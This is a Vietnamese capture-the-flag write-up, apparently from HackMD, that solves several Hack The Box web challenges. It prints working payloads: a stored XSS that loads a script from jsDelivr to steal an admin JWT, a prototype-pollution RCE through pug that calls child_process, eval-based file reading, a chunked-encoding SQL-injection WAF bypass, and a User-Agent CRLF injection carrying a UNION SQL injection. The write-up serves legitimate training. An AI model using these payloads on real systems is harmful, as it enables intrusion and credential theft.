			waitUntil: 'networkidle2',
			timeout: 5000
		});

		await page.goto('http://127.0.0.1:1337/admin/delete_all', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

		setTimeout(() => {
			browser.close();
		}, 5000);

    } catch(e) {
        console.log(e);
    }
};

module.exports = { visit };
```

- Sử dụng chronium `puppeteer` sau đó truy cập /admin với token chứa flag.
- sau đó nó truy cập :

```
await page.goto('http://127.0.0.1:1337/admin/delete_all', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});
```

- ở endpoint /admin :

```
router.get('/admin', AuthMiddleware, (req, res) => {
    if (req.user.user_role !== 'admin') {
        return res.status(401).send(response('Unautorized!'));
    }

    return db.get_party_requests()
        .then((data) => {
            res.render('admin.html', { requests: data });
        });
});
```
- sẽ check middleware nếu là admin mới cho truy cập sau đó thực hiện query sql:


```
	async get_party_requests(){
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('SELECT * FROM party_requests');
				resolve(await stmt.all());
			} catch(e) {
				reject(e);
			}
		});
	}
```
- Trả ra tất cả bản ghi từ `party_requests` sau đó hiển thị ra trang admin.

- Còn `/admin/delete_all`:

```
router.get('/admin/delete_all', AuthMiddleware, (req, res) => {
    if (req.user.user_role !== 'admin') {
        return res.status(401).send(response('Unautorized!'));
    }
    
    return db.remove_requests()
            .then(() => res.send(response('All records are deleted!')));
})
```

- cũng cần role admin sau đó gọi :

```
	async remove_requests(){
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('DELETE FROM party_requests');
				resolve(await stmt.run());
			} catch(e) {

			}
		})
	}

```
- Thực hiện xóa tất cả bản ghi ở bảng trên.
- Vậy thì chỉ có thể thấy bài này có hướng XSS với page admin.html:

```
<html>
    <head>
        <link rel="stylesheet" href="/static/css/bootstrap.min.css" />
        <title>Admin panel</title>
    </head>

    <body>
        <div class="container" style="margin-top: 20px">
            {% for request in requests %} 
                <div class="card">
                <div class="card-header"> <strong>Halloween Name</strong> : {{ request.halloween_name | safe }} </div>
                <div class="card-body">
                    <p class="card-title"><strong>Email Address</strong>    : {{ request.email }}</p>
                    <p class="card-text"><strong>Costume Type </strong>   : {{ request.costume_type }} </p>
                    <p class="card-text"><strong>Prefers tricks or treat </strong>   : {{ request.trick_or_treat }} </p>
                    
                    <button class="btn btn-primary">Accept</button>
                    <button class="btn btn-danger">Delete</button>
                </div>
            </div>
            {% endfor %}
        </div>

    </body>
</html>
```

- Có thể thấy là thuộc tính ` {{ request.halloween_name | safe }}` có thể bị XSS vì vậy ta sẽ lợi dụng nó để có thể gọi được cookie chuwad token ra bên ngoài.
- Đây là phương thức để add thông tin vào database:

```
async party_request_add(halloween_name, email, costume_type, trick_or_treat) {
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('INSERT INTO party_requests (halloween_name, email, costume_type, trick_or_treat) VALUES (?, ?, ?, ?)');
				resolve((await stmt.run(halloween_name, email, costume_type, trick_or_treat)));
			} catch(e) {
				reject(e);
			}
		});
	}

```

- nó được sử dụng bới /api/submit:

```
router.post('/api/submit', (req, res) => {
    const { halloween_name, email, costume_type, trick_or_treat } = req.body;

    if (halloween_name && email && costume_type && trick_or_treat) {

        return db.party_request_add(halloween_name, email, costume_type, trick_or_treat)
            .then(() => {
                res.send(response('Your request will be reviewed by our team!'));

                bot.visit();
            })
            .catch(() => res.send(response('Something Went Wrong!')));
    }

    return res.status(401).send(response('Please fill out all the required fields!'));
});
```
- Nhận các giá trị như nêu trên say đó thêm vào database nếu chúng tồn tại -> gọi bot để cho nó đi đến admin view

### Flow
- Tạo XSS với giá trị của  {{ request.halloween_name | safe }} cho lưu vào database sau đó bot sẽ đến admin.html và trang này hiển thị payload XSS được lưu vào db của ta -> thực hiện gọi cookie của bot ra ngoài và lấy cờ với jwt.io.

- Nhưng vấn đề lớn nhất ở đây là CSP:

```
app.use(function (req, res, next) {
    res.setHeader(
        "Content-Security-Policy",
        "script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'"
    );
    next();
});
```

- Nhưng có một chỗ có thể lợi dụng ở đây là script cho phép nguồn từ `https://cdn.jsdelivr.net` mà ta có thể control được ở đây -> tạo payload xss -> tạo thẻ <script src="https://cdn.jsdelivr.net/control.js"></script>
- Và cuối cùng chỉ cần đợi bot call giá trị ra thôi.
- Có thể dùng trang web này post js của mình lên vùng nhớ của https://cdn.jsdelivr.net

https://www.jsdelivr.com/github

![image](https://hackmd.io/_uploads/H1rnfPJIC.png)

![image](https://hackmd.io/_uploads/SJy0GvJ8R.png)


![image](https://hackmd.io/_uploads/SydxQvJUR.png)


![image](https://hackmd.io/_uploads/BJpIQPyUR.png)

```
POST /api/submit HTTP/1.1
Host: 94.237.54.176:47791
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.54.176:47791/
Content-Type: application/json
Content-Length: 183
Origin: http://94.237.54.176:47791
Connection: close
Priority: u=1

{"halloween_name":"<script src=\"https://cdn.jsdelivr.net/gh/l3mnt2010/jsdelivr@main/index.js\"></script>","email":"hihi@gmail.com","costume_type":"monster","trick_or_treat":"tricks"}
```

![image](https://hackmd.io/_uploads/Byq_QDk80.png)

``
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9yb2xlIjoiYWRtaW4iLCJmbGFnIjoiSFRCe2Qwbid0XzRsbDB3X2Nkbl8xbl9jNXAhIX0iLCJpYXQiOjE3MTg3Mzk3ODB9.dzm05GgI5Sjx73YeH7VIFXrOpG8cfd6gnBbo3oProyE
``

![image](https://hackmd.io/_uploads/ry59XvJLR.png)

flag : `HTB{d0n't_4ll0w_cdn_1n_c5p!!}`

## Gunship

- Một chall với nodejs:

```

const express       = require('express');
const app           = express();
const routes        = require('./routes');
const path          = require('path');

app.use(express.json());
app.set('views','./views');
app.use('/static', express.static(path.resolve('static')));

app.use(routes);

app.all('*', (req, res) => {
    return res.status(404).send('404 page not found');
});

app.listen(1337, () => console.log('Listening on port 1337'));
```

- Quan sát các route:

```
const path              = require('path');
const express           = require('express');
const pug        		= require('pug');
const { unflatten }     = require('flat');
const router            = express.Router();

router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
    const { artist } = unflatten(req.body);

	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the full name of an existing member.'
		});
	}
});

module.exports = router;
```

- Server sử dụng template pugjs và `flat` dùng để decode body, có duy nhất api này:

```
router.post('/api/submit', (req, res) => {
    const { artist } = unflatten(req.body);

	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the full name of an existing member.'
		});
	}
});
```

- server nhận `artist` từ body được qua `unflatten(req.body)` sau đó check nếu có `Haigh` `Westaway` `Gingell` trong artist thì sẽ hiển thị thông báo user với pugjs nếu không thì yêu cầu cung cấp từ có chứa 1 trong 3 kí tự.
- Searching flat bản `5.0.0` :

![image](https://hackmd.io/_uploads/HJgLSwJU0.png)

Một cve critical với đúng version < 5.0.1 bị dính prototype polution luôn.

- `var unflatten = require('flat').unflatten;

unflatten({
    '__proto__.polluted': true
});

console.log(polluted); // true`

- Vấn đề ở đây là phải RCE để lấy được flag do đó ta seaching bug của pugjs thử:

- Tiếp tục là một lỗ hổng RCE đúng như ý ta:

![image](https://hackmd.io/_uploads/HyYb8PyUC.png)

POC của pug:

`http://localhost:5000/?p=');process.mainModule.constructor._load('child_process').exec('whoami');_=('`

- Bây giờ ta sẽ làm Prototype polution để rce được nó.


```

	{
			"artist.name":"Haigh","__proto__.block": {
	        "type": "Text", 
	        "line": "process.mainModule.require('child_process').execSync('')"
		    }
		}
```

![image](https://hackmd.io/_uploads/rk3XKQlL0.png)

![image](https://hackmd.io/_uploads/SJbCK7e8C.png)

![image](https://hackmd.io/_uploads/B1qkq7lUA.png)

flag : `HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}`

# easy

## jscalc
![image](https://hackmd.io/_uploads/ByYoi7x8R.png)


- Một chall nodejs:

```
const express       = require('express');
const app           = express();
const bodyParser    = require('body-parser');
const routes        = require('./routes');
const path          = require('path');

app.use(bodyParser.json());

app.set('views', './views');
app.use('/static', express.static(path.resolve('static')));

app.use(routes);

app.all('*', (req, res) => {
    return res.status(404).send({
        message: '404 page not found'
    });
});

app.listen(1337, () => console.log('Listening on port 1337'));
```

- Có một route chính như sau:

```
const path       = require('path');
const express    = require('express');
const router     = express.Router();
const Calculator = require('../helpers/calculatorHelper');

const response = data => ({ message: data });

router.get('/', (req, res) => {
	return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/calculate', (req, res) => {
	let { formula } = req.body;

	if (formula) {
		result = Calculator.calculate(formula);
		return res.send(response(result));
	}

	return res.send(response('Missing parameters'));
})

module.exports = router;

// ocd
```

- api/calculate sẽ nhận `formula` sau đó gọi phương thức `Calculator.calculate(formula);` và trả ra kết quả phép tính:

```
module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${ formula } ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
}


// ocd
```

- Có thể thấy chính xác ở đây dùng eval để thực hiện phép tính -> lợi dụng để RCE.

- Flag nằm ở root cho nên ta cần phải RCE:

```
FROM node:alpine

# Install packages
RUN apk add --update --no-cache supervisor g++ make python3

# Setup app
RUN mkdir -p /app

# Add application
WORKDIR /app
COPY challenge .

# Add flag
COPY flag.txt /

# Install dependencies
RUN npm install

# Setup superivsord
COPY config/supervisord.conf /etc/supervisord.conf

# Expose the port node-js is reachable on
EXPOSE 1337

# Start the node-js application
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```

- ở đây mình sẽ sử dụng fs để đọc:

`require('fs').readFileSync('/flag.txt', 'utf8')`

![image](https://hackmd.io/_uploads/HkJ237lUC.png)

![image](https://hackmd.io/_uploads/ByrahXgUR.png)

flag : `HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}`




## Insomnia

- Một chall sử dụng source php khá là phức tạp:

![image](https://hackmd.io/_uploads/BJ0mO4gLC.png)


- Chương trình có chức năng đăng kí đăng nhập sau đó được chuyển đến profile của người dùng.

```
<?php

namespace App\Controllers;

use App\Controllers\BaseController;
use CodeIgniter\HTTP\ResponseInterface;
use Config\Paths;
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

class ProfileController extends BaseController
{
    public function index()
    {
        $token = (string) $_COOKIE["token"] ?? null;
        $flag = file_get_contents(APPPATH . "/../flag.txt");
        if (isset($token)) {
            $key = (string) getenv("JWT_SECRET");
            $jwt_decode = JWT::decode($token, new Key($key, "HS256"));
            $username = $jwt_decode->username;
            if ($username == "administrator") {
                return view("ProfilePage", [
                    "username" => $username,
                    "content" => $flag,
                ]);
            } else {
                $content = "Haven't seen you for a while";
                return view("ProfilePage", [
                    "username" => $username,
                    "content" => $content,
                ]);
            }
        }
    }
}

```

- Đây là nơi hiển thị thông tin của người dùng đó là trang profile mà ta nhắc đến ở trên nếu mà người dùng có username là `administrator` thì sẽ trả ra flag còn nếu mà không phải thì chỉ trả ra `Haven't seen you for a while` -> ta cần leo quyền lên admin để đạt được mục đích.

- Như ta có thể thấy thì ở đây đó chính là phần userController cũng chính là logic mà chúng ta sử dụng để đăng nhập / đăng kí.

```
<?php

namespace App\Controllers;

use CodeIgniter\Controller;
use CodeIgniter\API\ResponseTrait;
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

class UserController extends Controller
{
    use ResponseTrait;

    public function LoginIndex()
    {
        return View("LoginPage");
    }
    public function login()
    {
        $db = db_connect();
        $json_data = request()->getJSON(true);
        if (!count($json_data) == 2) {
            return $this->respond("Please provide username and password", 404);
        }
        $query = $db->table("users")->getWhere($json_data, 1, 0);
        $result = $query->getRowArray();
        if (!$result) {
            return $this->respond("User not found", 404);
        } else {
            $key = (string) getenv("JWT_SECRET");
            $iat = time();
            $exp = $iat + 36000;
            $headers = [
                "alg" => "HS256",
                "typ" => "JWT",
            ];
            $payload = [
                "iat" => $iat,
                "exp" => $exp,
                "username" => $result["username"],
            ];
            $token = JWT::encode($payload, $key, "HS256");

            $response = [
                "message" => "Login Succesful",
                "token" => $token,
            ];
            return $this->respond($response, 200);
        }
    }

    public function RegisterIndex()
    {
        return View("RegisterPage");
    }
    public function register()
    {
        $db = db_connect();
        $json_data = request()->getJSON(true);
        $username = $json_data["username"] ?? null;
        $password = $json_data["password"] ?? null;

        if (!($username && $password)) {
            return $this->respond("Empty username or password", 404);
        } else {
            // Check if the username already exists
            $existingUser = $db
                ->table("users")
                ->where("username", $username)
                ->get()
                ->getRow();

            if ($existingUser) {
                return $this->respond("Username already exists", 400);
            }

            // Insert the new user if the username is unique
            $db->table("users")->insert([
                "username" => $username,
                "password" => $password,
            ]);

            if ($db->affectedRows() > 0) {
                return $this->respond(
                    "Registration successful for user: " . $username,
                    200
                );
            } else {
                return $this->respond("Registration failed", 404);
            }
        }
    }
}

```


- Đầu tiên mình sẽ nói về chức năng đăng kí trước:
- Sau khi connect database thì server sẽ nhận 2 parameter từ client dưới dạng json đó là username và password -> thực hiện check tên username có trong db hay chưa nếu có thì trả ra content là người dùng đã tồn tại -> nếu chưa có thì thực hiện insert dữ liệu vào db :

```
$db->table("users")->insert([
                "username" => $username,
                "password" => $password,
            ]);
```


- Đến với chức năng đăng nhập của người dùng -> tương tự server cũng sẽ nhận dữ liệu dưới dạng json từ người dùng sau đó thực hiện check trong db nhưn bug ở đây là người dùng không check password của user:

```
$query = $db->table("users")->getWhere($json_data, 1, 0);
        $result = $query->getRowArray();
```

- Mà chỉ thực hiện check username nếu mà có thì sẽ thực hiện tạo token cho user đó.
### Access control vulnerability

- Thực hiện leo quyền lên admin :

![image](https://hackmd.io/_uploads/BJgbaVxI0.png)

![image](https://hackmd.io/_uploads/rJ8kp4lUC.png)

![image](https://hackmd.io/_uploads/ryYkaVgI0.png)

flag : `HTB{I_just_want_to_sleep_a_little_bit!!!!!}`


## 0xBOverchunked

- tiếp tục một chall với php source:

```
PS D:\ctf_chall\HTBAgain\0xBOverchunked> tree
D:.
├───challenge
│   ├───assets
│   │   ├───images
│   │   │   └───posts
│   │   └───styles
│   ├───Controllers
│   │   ├───Database
│   │   ├───Handlers
│   │   └───WAF
│   └───db
└───conf
PS D:\ctf_chall\HTBAgain\0xBOverchunked>

```


- Có thể thấy chương trình viết theo mô hình MVC cơ bản -> đi sâu vào từng file của chương trình.

- Chương trình sử dụng sqlite db + PDO đề connect db.

- ở đây chúng ta đã có 2 method để truy vấn vào trong csdl:

```
<?php
require_once 'Connect.php';

function safequery($pdo, $id)
{
    if ($id == 6)
    {
        die("You are not allowed to view this post!");
    }

    $stmt = $pdo->prepare("SELECT id, gamename, gamedesc, image FROM posts  WHERE id = ?");
    $stmt->execute([$id]);

    $result = $stmt->fetch(PDO::FETCH_ASSOC);

    return $result;
}

function unsafequery($pdo, $id)
{
    try
    {
        $stmt = $pdo->query("SELECT id, gamename, gamedesc, image FROM posts WHERE id = '$id'");
        $result = $stmt->fetch(PDO::FETCH_ASSOC);
        return $result;
    }
    catch(Exception $e)
    {
        http_response_code(500);
        echo "Internal Server Error";
        exit();
    }
}

?>

```


- Khi build server thì init.sql chứa flag:

```
CREATE TABLE posts (
  id INTEGER PRIMARY KEY,
  gamename TEXT NOT NULL,
  gamedesc TEXT NOT NULL,
  image BLOB NOT NULL
);

INSERT INTO posts (gamename, gamedesc, image)
VALUES
  ('Pikachu', 'A small, yellow, mouse-like creature with a lightning bolt-shaped tail. Pikachu is one of the most popular and recognizable characters from the Pokemon franchise.', '1.png'),
  ('Pac-Man', 'Pac-Man is a classic arcade game where you control a yellow character and navigate through a maze, eating dots and avoiding ghosts.', '2.png'),
  ('Sonic', 'He is a blue anthropomorphic hedgehog who is known for his incredible speed and his ability to run faster than the speed of sound.', '3.png'),
  ('Super Mario', 'Its me, Mario, an Italian plumber who must save Princess Toadstool from the evil Bowser.', '4.png'),
  ('Donkey Kong', 'Donkey Kong is known for his incredible strength, agility, and his ability to swing from vines and barrels.', '5.png'),
  ('Flag', 'HTB{f4k3_fl4_f0r_t35t1ng}', '6.png');

```

- có một bảng post sau đó có các bản ghi như trên được insert vào bảng -> hướng đến sqli để lấy flag.

- Đây là source chính của chương trình hiển thị lúc khởi đầu:


```

<?php
require_once '../Database/Cursor.php';
require_once '../WAF/waf.php';

if (isset($_SERVER["HTTP_TRANSFER_ENCODING"]) && $_SERVER["HTTP_TRANSFER_ENCODING"] == "chunked")
{
    $search = $_POST['search'];

    $result = unsafequery($pdo, $search);

    if ($result)
    {
        echo "<div class='results'>No post id found.</div>";
    }
    else
    {
        http_response_code(500);
        echo "Internal Server Error";
        exit();
    }

}
else
{
    if ((isset($_POST["search"])))
    {
        $search = $_POST["search"];
        if (waf_sql_injection($search))
        {
            $result = safequery($pdo, $search);
            if ($result)
            {
                echo '
                    <div class="grid-container">
                    <div class="grid-item">
                        <img class="post-logo" src="../../assets/images/posts/' . $result["image"] . '" width="100">
                    </div>
                    <div class="grid-item">
                        <p><font color="#F44336">Name</font>: ' . $result["gamename"] . '</p>
                        <p><font color="#F44336">Description</font>: ' . $result["gamedesc"] . '</p>
                    </div>
                    </div>';
            }
            else
            {
                echo "<div class='results'>No post id found.</div>";
            }
        }
        else
        {
            echo "<div class='results'>SQL Injection attempt identified and prevented by WAF!</div>";
        }
    }
    else
    {
        echo "<div class='results'>Unsupported method!</div>";
        http_response_code(400);
    }

}

?>

```

- Đầu tiên ta có một if để check header nếu mà `HTTP_TRANSFER_ENCODING` tồn tại và giá trị của nó là `chunked` sau đó sẽ lấy parameter `search` từ method POST -> gọi method `unsafequery` nếu mà có kết quả thì trả ra `No post id found` nếu không thì 500 status 
- Nếu không phải chunked thì sẽ thực hiện :


```
else
{
    if ((isset($_POST["search"])))
    {
        $search = $_POST["search"];
        if (waf_sql_injection($search))
        {
            $result = safequery($pdo, $search);
            if ($result)
            {
                echo '
                    <div class="grid-container">
                    <div class="grid-item">
                        <img class="post-logo" src="../../assets/images/posts/' . $result["image"] . '" width="100">
                    </div>
                    <div class="grid-item">
                        <p><font color="#F44336">Name</font>: ' . $result["gamename"] . '</p>
                        <p><font color="#F44336">Description</font>: ' . $result["gamedesc"] . '</p>
                    </div>
                    </div>';
            }
            else
            {
                echo "<div class='results'>No post id found.</div>";
            }
        }
        else
        {
            echo "<div class='results'>SQL Injection attempt identified and prevented by WAF!</div>";
        }
    }
    else
    {
        echo "<div class='results'>Unsupported method!</div>";
        http_response_code(400);
    }
```

- Tương tự như trên thì vẫn lấy param search sau đó trải qua waf `waf_sql_injection` :


```
function waf_sql_injection($input)
{
    $sql_keywords = array(
        'SELECT',
        'INSERT',
        'UPDATE',
        'DELETE',
        'UNION',
        'DROP',
        'TRUNCATE',
        'ALTER',
        'CREATE',
        'FROM',
        'WHERE',
        'GROUP BY',
        'HAVING',
        'ORDER BY',
        'LIMIT',
        'OFFSET',
        'JOIN',
        'ON',
        'SET',
        'VALUES',
        'INDEX',
        'KEY',
        'PRIMARY',
        'FOREIGN',
        'REFERENCES',
        'TABLE',
        'VIEW',
        'AND',
        'OR',
        "'",
        '"',
        "')",
        '-- -',
        '#',
        '--',
        '-'
    );

    foreach ($sql_keywords as $keyword)
    {
        if (stripos($input, $keyword) !== false)
        {
            return false;
        }
    }
    return true;
}
```

- Hàm này sẽ sử dụng vòng lặp foreach sau đó dùng strpos để so sánh nếu có bất kì kí tự nào nằm trong search của chúng ta thì sẽ trả ra false.
- Như ở trên Cursor chúng ta đã nói thì chỉ có hàm :

```

function unsafequery($pdo, $id)
{
    try
    {
        $stmt = $pdo->query("SELECT id, gamename, gamedesc, image FROM posts WHERE id = '$id'");
        $result = $stmt->fetch(PDO::FETCH_ASSOC);
        return $result;
    }
    catch(Exception $e)
    {
        http_response_code(500);
        echo "Internal Server Error";
        exit();
    }
}
```

- Dính sqli và nó được sử dụng khi `HTTP_TRANSFER_ENCODING` là `chunked` thì method này sẽ được gọi và bỏ qua waf luôn -> nhưng vấn đề của bài này là blind.


https://kulv.eu/posts/10



## Blueprint Heist


Link: https://hackmd.io/3qU5TxPlQDKNAac9VyGrLA?view#WebBlueprint-Heist



## Labyrinth Linguist

Link: https://hackmd.io/17yFgOmaQs252Gg5dQwQKg#Labyrinth_linguist4

## GateCrash

- Một chall chạy go server với proxy server chạy bằng nim server + sqlite3 database:

### Go server


```
func main() {
	var err error
	db, err = sql.Open("sqlite3", sqlitePath)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	seedDatabase()

	r := mux.NewRouter()
	r.HandleFunc("/login", loginHandler).Methods("POST")

	http.Handle("/", r)
	fmt.Println("Server is running on " + strconv.Itoa(webPort))
	http.ListenAndServe(":"+strconv.Itoa(webPort), nil)
}

```

- ở đây ta chỉ thấy khi khởi tạo server sẽ khởi tạo sqlite3 sau đó gọi `seedDatabase` sau đó chúng ta connect được /login với method `POST` và `loginHandler` để xử lí logic ở đây.

```
func seedDatabase() {
	createTable := `
	CREATE TABLE IF NOT EXISTS users (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		username TEXT NOT NULL,
		password TEXT NOT NULL
	);
	`

	_, err := db.Exec(createTable)
	if err != nil {
		log.Fatal(err)
	}

	for i := 0; i < 10; i++ {
		newUser, _ := randomHex(32)
		newPass, _ := randomHex(32)

		hashedPassword, err := bcrypt.GenerateFromPassword([]byte(newPass), bcrypt.DefaultCost)
		if err != nil {
			fmt.Println(err)
			return
		}

		_, err = db.Exec("INSERT INTO users (username, password) VALUES ('" + newUser + "', '" + string(hashedPassword) + "');")
		if err != nil {
			fmt.Println(err)
			return
		}
	}
}
```

- ở đây nó sẽ tạo một bảng users với các cột là id, username, password -> insert 10 user đầu tiên vào trong bảng users vơi tên username, password được `randomHex` và password sẽ được `bcrypt`.

- api /login sex trả về một :

```
func loginHandler(w http.ResponseWriter, r *http.Request) {
	found := false
	for _, userAgent := range allowedUserAgents {
		if strings.Contains(r.Header.Get("User-Agent"), userAgent) {
			found = true
			break
		}
	}

	if !found {
		http.Error(w, "Browser not supported", http.StatusNotAcceptable)
		return
	}

	var user User
	err := json.NewDecoder(r.Body).Decode(&user)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	userPassword := user.Password

	row := db.QueryRow("SELECT * FROM users WHERE username='" + user.Username + "';")
	err = row.Scan(&user.ID, &user.Username, &user.Password)
	if err != nil {
		http.Error(w, "Invalid username or password", http.StatusUnauthorized)
		return
	}

	err = bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(userPassword))
	if err != nil {
		http.Error(w, "Invalid username or password", http.StatusUnauthorized)
		return
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprintln(w, "Login successful")
}

```

- đầu tiên sẽ check xem của header User-Agent hay không nếu mà có thì cho qua -< sau đó sẽ thực hiện một lệnh truy vấn vào trong database:

`row := db.QueryRow("SELECT * FROM users WHERE username='" + user.Username + "';")` -> theo như quan sát thì ta thấy câu truy vấn bị sqli do việc cộng chuỗi và câu lệnh này sẽ kiểm tra là username này đã tồn tại ở trong db hay chưa-> nếu chưa thì thực hiện brcypt mật khẩu và lưu vào trong db -> trả về status 200

- Mục tiêu ở đây là chúng lấy được flag nhưng flag nằm trong nim proxy nên bây giờ chúng ta hãy phân tích

### Nim proxy


```
import asyncdispatch, strutils, jester, httpClient, json
import std/uri

const userApi = "http://127.0.0.1:9090"

proc msgjson(msg: string): string =
  """{"msg": "$#"}""" % [msg]

proc containsSqlInjection(input: string): bool =
  for c in input:
    let ordC = ord(c)
    if not ((ordC >= ord('a') and ordC <= ord('z')) or
            (ordC >= ord('A') and ordC <= ord('Z')) or
            (ordC >= ord('0') and ordC <= ord('9'))):
      return true
  return false

settings:
  port = Port 1337

routes:
  post "/user":
    let username = @"username"
    let password = @"password"

    if containsSqlInjection(username) or containsSqlInjection(password):
      resp msgjson("Malicious input detected")

    let userAgent = decodeUrl(request.headers["user-agent"])

    let jsonData = %*{
      "username": username,
      "password": password
    }

    let jsonStr = $jsonData

    let client = newHttpClient(userAgent)
    client.headers = newHttpHeaders({"Content-Type": "application/json"})

    let response = client.request(userApi & "/login", httpMethod = HttpPost, body = jsonStr)

    if response.code != Http200:
      resp msgjson(response.body.strip())
       
    resp msgjson(readFile("/flag.txt"))

runForever()

```
- Có thể thấy nó chạy ở port 1337 và sẽ chuyển tiếp các yêu cầu đến port 9090 -> để ý ở đây chỉ có một route /user:

```
routes:
  post "/user":
    let username = @"username"
    let password = @"password"

    if containsSqlInjection(username) or containsSqlInjection(password):
      resp msgjson("Malicious input detected")

    let userAgent = decodeUrl(request.headers["user-agent"])

    let jsonData = %*{
      "username": username,
      "password": password
    }

    let jsonStr = $jsonData

    let client = newHttpClient(userAgent)
    client.headers = newHttpHeaders({"Content-Type": "application/json"})

    let response = client.request(userApi & "/login", httpMethod = HttpPost, body = jsonStr)

    if response.code != Http200:
      resp msgjson(response.body.strip())
       
    resp msgjson(readFile("/flag.txt"))
```

- nhận username và password của người dùng -> sau đó check qua hàm `containsSqlInjection` cả 2 tham số này:

``
proc containsSqlInjection(input: string): bool =
  for c in input:
    let ordC = ord(c)
    if not ((ordC >= ord('a') and ordC <= ord('z')) or
            (ordC >= ord('A') and ordC <= ord('Z')) or
            (ordC >= ord('0') and ordC <= ord('9'))):
      return true
  return false
``

- Như đã thấy thì chỉ cho phép các kí tự nằm từ a-zA-Z0-9 -> nếu kiểm tra thành công sẽ lấy user-agent từ header + jsonData là username và password đã nói ở trên -> thực hiện gửi đến go server để login nếu mà trả ra 200 -> nhận flag.

### Flow

- Ta sẽ dùng crlf để bypass việc gửi username và pasword của người dùng để vượt qua waf


![image](https://hackmd.io/_uploads/HyWdhkd8R.png)


- Nếu build docker thì có thể dùng lệnh : `curl "http://localhost:9090/login" -X POST   --data-binary $'{\"username\":\"asas\' union select 1 as id , \'hacker\' as username , \'$2a$10$N2/NBEeXbAL5XqK6l.ZLAuJkZgRcWE9SLcXJlQ.paq/5c0bTqoFne\' as password  -- \", \"password\":\"password123\"}' -H "User-Agent: Mozilla/7.0" -H "Content-Type: application/json"` để kiểm tra xem sqli của bạn có hoạt động hay không


### Khai thác


![image](https://hackmd.io/_uploads/HklvTkO8A.png)

![image](https://hackmd.io/_uploads/SyY9Ak_U0.png)


```
POST /user HTTP/1.1
Host: 94.237.54.176:38751
User-Agent: Mozilla/7.0%0d%0a%0d%0a%7b%22username%22%3a%22asas'%20union%20select%201%20as%20id%2c%20'hacker'%20as%20username%2c%20'%242a%2410%24N2%2fNBEeXbAL5XqK6l.ZLAuJkZgRcWE9SLcXJlQ.paq%2f5c0bTqoFne'%20as%20password%20%20--%20%22%2c%22password%22%3a%22password123%22%7d
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.54.176:38751/
Content-Type: application/x-www-form-urlencoded
Content-Length: 173
Origin: http://94.237.54.176:38751
Connection: close
Priority: u=1

username=hehaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae&password=huhuaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```


flag : `HTB{do_the_d45h_0n_d4_p4r53r!}`


## Saturn

- Một chall với python flask:

```
from flask import Flask, request, render_template
import requests
from safeurl import safeurl

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        try:
            su = safeurl.SafeURL()
            opt = safeurl.Options()
            opt.enableFollowLocation().setFollowLocationLimit(0)
            su.setOptions(opt)
            su.execute(url)
        except:
            return render_template('index.html', error=f"Malicious input detected.")
        r = requests.get(url)
        return render_template('index.html', result=r.text)
    return render_template('index.html')


@app.route('/secret')
def secret():
    if request.remote_addr == '127.0.0.1':
        flag = ""
        with open('./flag.txt') as f:
            flag = f.readline()
        return render_template('secret.html', SECRET=flag)
    else:
        return render_template('forbidden.html'), 403


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=1337, threaded=True)

```

- Có thể thấy là server có 2 route chính :
```
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        try:
            su = safeurl.SafeURL()
            opt = safeurl.Options()
            opt.enableFollowLocation().setFollowLocationLimit(0)
            su.setOptions(opt)
            su.execute(url)
        except:
            return render_template('index.html', error=f"Malicious input detected.")
        r = requests.get(url)
        return render_template('index.html', result=r.text)
    return render_template('index.html')

```

- Route / sẽ nhận 2 method ở đây ta sẽ quan tâm đến POST server nhận url do ta cung cấp sau đó check url qua module: `safeurl`
- Nếu thành công thì sẽ thực hiện gửi request đến url của mình gửi, còn nếu mà không thành công thì sẽ hiển thị lỗi, và khi thành công sẽ trả ra kết quả.
- Route /secret:

```
@app.route('/secret')
def secret():
